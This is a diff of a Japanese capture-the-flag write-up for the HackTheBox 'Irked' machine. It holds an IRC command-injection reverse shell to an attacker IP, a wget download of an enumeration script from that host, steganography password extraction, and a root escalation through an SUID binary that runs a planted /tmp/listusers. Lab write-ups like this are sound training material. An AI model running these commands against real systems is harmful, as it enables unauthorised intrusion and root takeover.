@@ -235,11 +235,13 @@ nc -lvnp 4444
 ```
 
 ```bash
-echo "AB; bash -i >& /dev/tcp/10.10.16.4/4444 0>&1" | nc 10.10.10.117 6697
+echo "AB; bash -i >& /dev/tcp/10.10.16.2/4444 0>&1" | nc 10.10.10.117 6697
 ```
 
+\>& hoge.txtは　\>& hoge.txt 2>&1と同じ意味。上記のシェルコマンドでは標準入力、標準出力、標準エラー出力すべてを１つにまとめてncatに渡している
+
 ```bash
-echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'" | nc 10.10.10.117 6697
+echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.16.2/4444 0>&1'" | nc 10.10.10.117 6697
 ```
 
 →nc上でバッシュを取得できた。
@@ -303,4 +305,130 @@ ircd@irked:/home/djmardov/Documents$
 python -m http.server 5555
 ```
 
-1
+```bash
+# at target machine
+cd tmp
+wget http://10.10.16.2:5555/LinEnum.sh
+```
+
+```bash
+chmod +x LinEnum.sh
+./LinEnum.sh
+```
+
+![image-20220731113422305](img/image-20220731113422305.png)
+
+![image-20220731113503544](img/image-20220731113503544.png)
+
+![image-20220731113824759](img/image-20220731113824759.png)
+
+```bash
+find . ls
+```
+
+```bash
+export TERM = xterm
+```
+
+これをすることで、clearができるようになった。なぜなのか後で調べる
+
+```bash
+cat .bash_history | less
+```
+
+こうすることでtumxでも上から下までコマンド実行で参照ができるので便利
+
+```bash
+ircd@irked:/home/djmardov$ uname -a
+Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux
+```
+
+uname -aでOS情報を確認して、脆弱性を探るのもよくやる営み
+
+![image-20220731131634298](img/image-20220731131634298.png)
+
+```bash
+apt install steghide
+```
+
+[ステガノグラフィー](https://e-words.jp/w/%E3%82%B9%E3%83%86%E3%82%AC%E3%83%8E%E3%82%B0%E3%83%A9%E3%83%95%E3%82%A3.html#:~:text=%E3%82%B9%E3%83%86%E3%82%AC%E3%83%8E%E3%82%B0%E3%83%A9%E3%83%95%E3%82%A3%20%E3%80%90steganography%E3%80%91&text=%E3%82%B9%E3%83%86%E3%82%AC%E3%83%8E%E3%82%B0%E3%83%A9%E3%83%95%E3%82%A3%E3%81%A8%E3%81%AF%E3%80%81%E7%94%BB%E5%83%8F%E3%82%84,%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%80%E3%81%93%E3%81%A8%E3%81%8C%E3%81%A7%E3%81%8D%E3%82%8B%E3%80%82)
+
+```bash
+wget http://10.10.10.117/irked.jpg
+```
+
+```bash
+steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+cat pass.txt
+```
+
+入手したパスワードでSSHする。
+
+```bash
+ssh djmardov@10.10.10.117 
+```
+
+ログイン成功し、user.txtを奪取できた。
+
+SUID files：Set User IDの略で、誰がそのファイルを実行してもセットされたユーザで実行される状態
+
+https://eng-entrance.com/linux-permission-suid
+
+LinEnum.shの中にSUIDの一覧も列挙される。これで興味深いコマンドが先ほどキャプチャをとったviewuserというコマンドというわけ。
+
+```bash
+djmardov@irked:~$ viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2022-07-30 22:15 (:0)
+djmardov pts/1        2022-07-31 00:32 (10.10.10.117)
+sh: 1: /tmp/listusers: Permission denied
+```
+
+```bash
+base64 -w0 /usr/bin/viewuser
+prefix + [
+v
+# コピー箇所をハイライト
+enter
+prefix + }
+```
+
+[tmuxでのコピー](https://qiita.com/gatapon/items/c7cf549ebffe86599be9)
+
+```
+base64 -d viewuser.b64 >q viewuser
+```
+
+```
+chmod +x viewuser
+strace ./viewuser
+ltrace ./viewuser
+```
+
+![image-20220731222318108](img/image-20220731222318108.png)
+
+/tmp/listusersファイルをsystemに渡している。
+
+```bash
+vi /tmp/listusers
+# 以下内容を追記
+#!/bin/bash
+/bin/bash
+
+chmod +x /tmp/listusers
+```
+
+```bash
+djmardov@irked:~/Documents$ viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2022-07-31 06:42 (:0)
+djmardov pts/0        2022-07-31 06:46 (10.10.16.2)
+root@irked:~/Documents# 
+```
+
+## 所感
+
+* めちゃくちゃ時間かかってしまった。tmuxの利用の仕方を学べたのでよかった。
+* 今回出てきたステガノブラフィーやstraceなどの手法は活用できるように今後していきたい。
